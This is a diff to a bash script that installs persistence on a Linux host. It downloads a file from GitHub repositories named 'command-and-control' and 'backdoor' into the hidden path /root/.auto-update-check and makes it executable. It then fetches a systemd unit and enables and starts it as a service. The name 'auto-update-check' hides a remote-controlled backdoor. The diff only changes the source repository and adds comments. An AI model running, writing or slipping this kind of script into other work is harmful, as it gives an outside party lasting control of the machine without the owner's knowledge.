@@ -1,7 +1,16 @@
 #!/bin/bash
-curl -s https://raw.githubusercontent.com/athulnair02/command-and-control/main/auto-update-check > /root/.auto-update-check
+
+# Your GitHub raw base URL
+BASE_URL="https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main"
+
+# Fetch the update-check script
+curl -s "$BASE_URL/auto-update-check" > /root/.auto-update-check
 chmod +x /root/.auto-update-check
-curl -s https://raw.githubusercontent.com/athulnair02/command-and-control/main/auto-update-check.service > /etc/systemd/system/auto-update-check.service
+
+# Fetch the systemd service file
+curl -s "$BASE_URL/auto-update-check.service" > /etc/systemd/system/auto-update-check.service
+
+# Reload systemd and enable the service
 systemctl daemon-reload
 systemctl enable auto-update-check
 systemctl start auto-update-check
